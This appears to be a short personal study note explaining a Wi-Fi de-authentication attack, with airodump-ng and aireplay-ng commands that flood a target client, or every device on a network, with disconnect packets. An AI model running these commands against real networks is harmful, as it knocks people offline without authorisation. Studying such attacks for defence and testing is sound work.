---
title: De-Authentication Attack
date: 2024-01-28 14:15:56 -0600
---

The attack is performed by changing our MAC to Target MAC and sending Disconnect Request to the Router  
Then acting as the Router and send disconnect packet to Target  
This attack can be performed on all networks. No need to know the connection key. No need to connect to the network as well

````bash
# Sniff the Network to attack
airodump-ng --bssid <router-bssid> --channel <channel> <interface> 
aireplay-ng --deauth 0 -a <router-bssid> -c <target-bssid> <interface>
````

By using `0` as value for `--deauth` we are saying send infinite deauth packets to target. We can use a number to limit the amount of packets sent.  
If we do not use `-c` flag in deauth attack then all devices on the network will be disconnected
